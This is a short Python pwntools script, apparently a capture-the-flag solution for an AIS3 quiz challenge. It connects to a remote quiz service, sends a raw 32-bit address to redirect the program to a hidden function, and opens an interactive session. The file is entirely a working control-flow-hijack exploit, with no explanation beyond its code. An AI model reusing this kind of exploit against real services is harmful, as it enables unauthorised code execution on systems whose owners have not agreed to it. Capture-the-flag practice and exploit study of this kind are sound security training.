#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "127.0.0.1"
#port = 8888
host = 'quiz.ais3.org'
port = 9561

youcantseeme = 0x0804860a
payload = p32(youcantseeme)

r = remote(host, port)

print (r.recvuntil(":"))
#print (payload)
raw_input("dada")
r.sendline("\x13\x86\x04\x08")
r.interactive()
